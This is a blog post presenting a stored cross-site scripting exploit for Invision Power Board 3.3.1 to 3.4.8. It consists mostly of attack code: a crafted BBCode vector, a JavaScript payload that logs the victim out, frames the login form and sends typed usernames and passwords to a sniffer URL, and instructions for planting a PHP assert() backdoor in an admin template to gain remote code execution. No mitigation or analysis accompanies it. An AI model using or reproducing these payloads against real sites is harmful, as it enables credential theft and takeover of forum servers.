=== Content from scriptinjection.blogspot.com_9b0eb11e_20250120_235003.html ===


# [Script Injection](https://scriptinjection.blogspot.com/)

## четверг, 14 февраля 2019 г.

### Invision Power Board 3.3.1 - 3.4.8 stored XSS in any message

### XSS Vector:

```
[b][twitter]qwe'onmouseover=parentElement.innerHTML='';document.body.appendChild(document.createElement('script')).src='data:,alert(1)'// style=opacity:0;position:fixed;left:0;top:0;width:5000px;height:5000px [member="%username_that_exists%"]qwe[/twitter][/b]
```
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhre08LhML5vA7nJcKDqTlAZX2RWfoAcfiiYiw2FEeokpp3RleoqIUhH6D4MWMpToA_uUDMl5K7hVMf8olT4BrltaGm4UfRVU1P6zXciUkvTmg5UCN-2FfwnXrbjXkomJdJ7tYSJE9T2I4/s400/ipb+alert.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhre08LhML5vA7nJcKDqTlAZX2RWfoAcfiiYiw2FEeokpp3RleoqIUhH6D4MWMpToA_uUDMl5K7hVMf8olT4BrltaGm4UfRVU1P6zXciUkvTmg5UCN-2FfwnXrbjXkomJdJ7tYSJE9T2I4/s1600/ipb%2Balert.PNG)alert

### XSS Payload:

| ``` sF = "https://example.com/a.php?a="; // Sniffer that wait intercepted credentials in get parameter.   function gC(name) { // get cookie  var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));  return matches ? decodeURIComponent(matches[1]) : undefined; }  function iP(){ // intercept passwords  fD = window.frames.fr.contentDocument || window.frames.fr.document  fS = fD.getElementsByTagName("form");  for(var i = 0; i < fS.length; i++){   if(fS[i].id == "login"){    fS[i].onsubmit = function(){     (new Image()).src = sF + atob("login=" + this.ips_username.value + ";password=" + this.ips_password.value);     document.cookie = "XSSED=1";    }   }  } }  function iW(){ // intercept window  document.body.style.overflow = "hidden";  document.documentElement.innerHTML="\x3ciframe name=fr onload=iP(); src=" + location +" style=border:0;width:" + (document.documentElement.clientWidth - 1) + "px;height:" + (document.documentElement.clientHeight - 4) + "px\x3e\x3c/iframe\x3e";  document.body.style.margin = 0;  }  if(gC("XSSED") != "1"){  img = new Image();  img.src = "index.php?app=core&module=global&section=login&do=logout&k=" + ipb.vars["secure_hash"] ;  img.setAttribute("onerror", "iW();");  document.body.appendChild(img); }  ``` Admin Panel RCE:Open URL: ``` /ipb/admin/index.php?app=core&module=templates&section=templates&do=list&setID=1&adsess=9a43a6719acda5ec05cf47e14a9e6ea7  ``` Then **Board Index** => **boardIndexTemplate**  After add next code: ``` <if test="isset($_POST['a'])"> ${assert($_POST['a'])} </if>  ``` Editted template  RCE example via $\_GET['a'] |

Автор:

[Psych0tr1a](https://www.blogger.com/profile/11863065311916928984 "author profile")

на

[06:56](https://scriptinjection.blogspot.com/2019/02/invision-power-board-331-348-stored-xss.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=8719278918197540125&postID=6731563286234943767&from=pencil "Изменить сообщение")

[Отправить по электронной почте](https://www.blogger.com/share-post.g?blogID=8719278918197540125&postID=6731563286234943767&target=email "Отправить по электронной почте")[Написать об этом в блоге](https://www.blogger.com/share-post.g?blogID=8719278918197540125&postID=6731563286234943767&target=blog "Написать об этом в блоге")[Поделиться в X](https://www.blogger.com/share-post.g?blogID=8719278918197540125&postID=6731563286234943767&target=twitter "Поделиться в X")[Опубликовать в Facebook](https://www.blogger.com/share-post.g?blogID=8719278918197540125&postID=6731563286234943767&target=facebook "Опубликовать в Facebook")[Поделиться в Pinterest](https://www.blogger.com/share-post.g?blogID=8719278918197540125&postID=6731563286234943767&target=pinterest "Поделиться в Pinterest")

#### Комментариев нет:

#### Отправить комментарий

[Следующее](https://scriptinjection.blogspot.com/2019/02/vanilla-forums-25-stored-xss-in-any.html "Следующее")

[Главная страница](https://scriptinjection.blogspot.com/)

Подписаться на:
[Комментарии к сообщению (Atom)](https://scriptinjection.blogspot.com/feeds/6731563286234943767/comments/default)

## Обо мне

[![Моя фотография](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3ynR3QlwtIolfIx7UxrKpN4xq2kbyJw5ffH8WjryWSskVOq5g9spbYbV5poiq1OBJNTlmIWqdGAokOMCL2JKAXraCHPpEi7E9GVt9_vKFt1XnA1k9-qhfcFN9EnFSDQ/s220/0_EBOW7O_400x400%5B1%5D.jpg)](https://www.blogger.com/profile/11863065311916928984)
[Psych0tr1a](https://www.blogger.com/profile/11863065311916928984)

[Просмотреть профиль](https://www.blogger.com/profile/11863065311916928984)

## Архив блога

* ▼
  [2019](https://scriptinjection.blogspot.com/2019/)
  (3)
  + ►
    [апреля](https://scriptinjection.blogspot.com/2019/04/)
    (1)
  + ▼
    [февраля](https://scriptinjection.blogspot.com/2019/02/)
    (2)
    - [Vanilla Forums < 2.5 Stored XSS in any message and...](https://scriptinjection.blogspot.com/2019/02/vanilla-forums-25-stored-xss-in-any.html)
    - [Invision Power Board 3.3.1 - 3.4.8 stored XSS in a...](https://scriptinjection.blogspot.com/2019/02/invision-power-board-331-348-stored-xss.html)

|  |  |
| --- | --- |

Тема "Корпорация "Чудеса"". Технологии [Blogger](https://www.blogger.com).


